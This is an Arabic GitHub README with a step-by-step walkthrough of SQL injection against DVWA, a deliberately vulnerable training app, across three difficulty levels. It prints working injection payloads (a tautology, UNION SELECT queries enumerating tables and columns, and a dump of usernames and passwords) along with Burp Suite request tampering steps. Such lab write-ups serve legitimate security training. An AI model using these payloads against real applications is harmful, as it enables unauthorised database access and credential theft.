
# ✅ حلول SQL Injection في DVWA

[![DVWA Image](https://github.com/kashrathod19/SQL-Injection-DVWA-SOLUTION/assets/54115061/280c20dd-f03c-4805-b139-2104a93e470a)](https://github.com/kashrathod19/SQL-Injection-DVWA-SOLUTION)

## مقدمة

تُعد DVWA (تطبيق الويب المعرض للاختراق بشكل متعمد) بيئة شهيرة لتعلم واختبار مهارات اختبار الاختراق بشكل قانوني وآمن.  
يركز هذا المستودع على **ثغرات حقن قواعد البيانات (SQL Injection)**، ويحتوي على شروحات مفصلة وحلول خطوة بخطوة لجميع مستويات التحدي.

تم إعداد هذا المستودع بواسطة **Nihar Rathod** المعروف باسم **Bugbot19**، وهو باحث أمني ومخترق أخلاقي.

---

## محتويات المستودع

- ✅ **حلول المستوى السهل (Low)**: توضيح تفصيلي لاستغلال ثغرات SQL Injection للمبتدئين.
- 🟡 **حلول المستوى المتوسط (Medium)**: شرح تقنيات أكثر تطورًا لتجاوز الحماية الجزئية.
- 🔴 **حلول المستوى الصعب (High)**: أساليب متقدمة لاختراق آليات الحماية المعقدة.

---

## 💻 SQL - المستوى السهل (Low)

### تجربة أولية

نقوم بإدخال `1` في خانة النص لاكتشاف طريقة عمل التطبيق.

![SQL Low 1](https://github.com/kashrathod19/SQL-Injection-DVWA-SOLUTION/assets/54115061/f5cf6cdf-6b73-4fc3-8143-cf2cd53fd895)

تم عرض بيانات المستخدم صاحب المعرف `1`.

### استرجاع جميع المستخدمين

نستخدم الحمولة التالية:
```
' or 1=1#
```

![SQL Low 2](https://github.com/kashrathod19/SQL-Injection-DVWA-SOLUTION/assets/54115061/21939e1a-d841-4e1f-a21d-7d4eaf1180a3)

### الحصول على أسماء الجداول

نستخدم الحمولة:
```
' union select table_name, null from information_schema.tables#
```

![SQL Tables](https://github.com/kashrathod19/SQL-Injection-DVWA-SOLUTION/assets/54115061/8873e7af-956d-444e-b57d-639da8e436cc)

تم العثور على جدول باسم `users`.

### استخراج أسماء الأعمدة

نستخدم الحمولة:
```
' union select column_name, null from information_schema.columns where table_name='users'#
```

![SQL Columns](https://github.com/kashrathod19/SQL-Injection-DVWA-SOLUTION/assets/54115061/6135d1b9-4163-4c2f-9a32-9fa6acebd729)

تم العثور على الأعمدة: `id`, `login`, `password`.

### استخراج بيانات المستخدمين

نستخدم الحمولة النهائية:
```
' union select user, password from users#
```

![SQL Final Data](https://github.com/kashrathod19/SQL-Injection-DVWA-SOLUTION/assets/54115061/b80fbf82-7fae-4b8c-b1a3-ac0ed991b28c)

تمكنا من عرض أسماء المستخدمين وكلمات المرور.

---

## 🟡 SQL - المستوى المتوسط (Medium)

### باستخدام Burp Suite

نفس الحمولة تعمل:
```
1 union select user, password from users#
```

نقوم بالتالي:
1. تفعيل الاعتراض في Burp Suite.
2. إرسال الطلب وتعديله.

![Burp Medium 1](https://github.com/kashrathod19/SQL-Injection-DVWA-SOLUTION/assets/54115061/649efa19-e910-4917-9192-303da6f1eac7)

نستهدف المتغير `id`.

![Burp Medium 2](https://github.com/kashrathod19/SQL-Injection-DVWA-SOLUTION/assets/54115061/ef0a9b27-069b-4f5e-990b-cd765424fa2b)

ثم نضغط على "Forward" ونلاحظ ظهور بيانات المستخدمين:

![Burp Medium 3](https://github.com/kashrathod19/SQL-Injection-DVWA-SOLUTION/assets/54115061/d9f4657a-17fe-453d-9ec2-38bc5acc1e72)

---

## 🔴 SQL - المستوى الصعب (High)

### أيضًا باستخدام Burp Suite

نفس الحمولة:
```
' union select user, password from users#
```

نضغط على الرابط لتغيير المعرف:

![Hard Step 1](https://github.com/kashrathod19/SQL-Injection-DVWA-SOLUTION/assets/54115061/f140ec91-5604-4903-a8cf-00ca950ecb72)

ثم يظهر نموذج جديد:

![Hard Step 2](https://github.com/kashrathod19/SQL-Injection-DVWA-SOLUTION/assets/54115061/39a191f6-6ae0-421b-a91e-e2bb46d3dc3c)

نُدخل الحمولة نفسها:

```
' union select user, password from users#
```

![Hard Step 3](https://github.com/kashrathod19/SQL-Injection-DVWA-SOLUTION/assets/54115061/704d0d77-b194-4fa3-8c78-74c7bd8fb911)

ثم نضغط على "Submit" ونشاهد النتائج:

![Hard Final Result](https://github.com/kashrathod19/SQL-Injection-DVWA-SOLUTION/assets/54115061/4e1209cb-0699-4b92-a450-aa077a3f174d)

---

## ✅ الخلاصة

هذا الدليل يغطي كيفية استغلال ثغرات SQL Injection في DVWA بجميع مستوياتها. يُوصى بالتدريب في بيئات افتراضية وعدم استخدام هذه الطرق على تطبيقات حقيقية إلا بإذن قانوني.

> 🔐 **التدريب الآمن هو أفضل وسيلة للتعلم دون التسبب بأي ضرر.**

---

👤 **إعداد:** [Nihar Rathod (Bugbot19)](https://github.com/kashrathod19)  
📁 **المصدر:** [GitHub Repository](https://github.com/kashrathod19/SQL-Injection-DVWA-SOLUTION)
